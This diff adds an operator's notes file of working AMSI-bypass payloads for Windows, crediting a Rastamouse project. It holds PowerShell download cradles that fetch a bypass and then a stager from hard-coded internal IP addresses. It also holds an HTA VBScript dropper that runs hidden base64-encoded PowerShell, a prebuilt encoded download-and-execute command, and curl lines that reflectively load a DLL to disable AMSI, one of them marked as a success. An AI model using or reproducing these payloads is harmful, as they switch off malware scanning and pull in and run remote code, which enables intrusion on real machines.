@@ -1,0 +1,40 @@
+-----------------------------------------------------------------------------------
+AMSI Bypass by Rastamouse: https://github.com/rasta-mouse/AmsiScanBufferBypass	   |
+-----------------------------------------------------------------------------------
+
+$string = 'iex ((new-object net.webclient).downloadstring("http://192.168.214.129/amsi-bypass")); if([Bypass.AMSI]::Disable() -eq "0") { iex ((new-object net.webclient).downloadstring("http://192.168.214.129/stager")) }'
+
+
+============== HTA: ============================
+<script language="VBScript">
+	Function var_func()
+		Dim var_shell
+		Set var_shell = CreateObject("Wscript.Shell")
+		var_shell.run "powershell.exe -nop -w 1 -enc ENCODED_COMMANDS=", 0, true
+	End Function
+
+	var_func
+	self.close
+</script>
+
+
++++++++++++++++++++++
+
+
+
+
+Final Payload:
+
+
++ SUCCESS: curl -Uri "http://192.168.1.175:9091/newamsibypass.exe" -OutFile newamsibypass.exe;[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\\amsibypass.dll"));[Bypass.AMSI];[Bypass.AMSI]::Disable()
+
+
++ ENCODED_COMMANDS: [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('iex ((new-object net.webclient).downloadstring("http://192.168.1.175:9091/amsibypass.ps1"))'))
+
+
++ TO RUN ENCODED_COMMANDS: powershell.exe -nop -w 1 -enc "aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADEANwA1ADoAOQAwADkAMQAvAGEAbQBzAGkAYgB5AHAAYQBzAHMALgBkAGwAbAAiACkAKQA="
+
+
+
++ curl -Uri "http://192.168.1.175:9091/amsibypass.dll" -OutFile amsibypass.dll;[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\\amsibypass.dll"));[Bypass.AMSI];[Bypass.AMSI]::Disable()
+
